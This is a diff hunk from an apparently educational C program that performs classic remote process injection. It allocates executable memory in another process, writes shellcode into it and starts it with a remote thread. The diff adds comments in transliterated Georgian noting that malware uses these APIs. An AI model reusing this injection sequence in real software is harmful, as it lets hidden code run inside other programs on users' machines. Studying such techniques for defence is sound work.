@@ -48,16 +48,17 @@ int main(int argc, char* argv[]){
 
 	printf("%s got a handle to the process!\n\\---0x%p\n", k, hProcess);
 
+	//iyenebs malware am apis xolme
 	//allocate bytes to process memory
 	rBuffer = VirtualAllocEx(hProcess, NULL, sizeOf(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); //PAGE_EXECUTE_READWRITE can be just replaced with 0x40
 	//maybe use VirtualProtect() to change the permissions of the memory
 	printf("%s allocated %zu-bytes with PAGE_EXECUTE_READWRITE permissions\n", k, sizeOf(shellcode));
 
-
+	//iyenebs malware am apis xolme
 	WriteProcessMemory(hProcess, rBuffer, shellcode, sizeOf(shellcode), NULL);
 	printf("%s allocated %zu-bytes to process memory\n", k, sizeOf(shellcode));
 
-
+	//iyenebs malware am apis xolme
 	//create thread for running the payload
 	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);
 
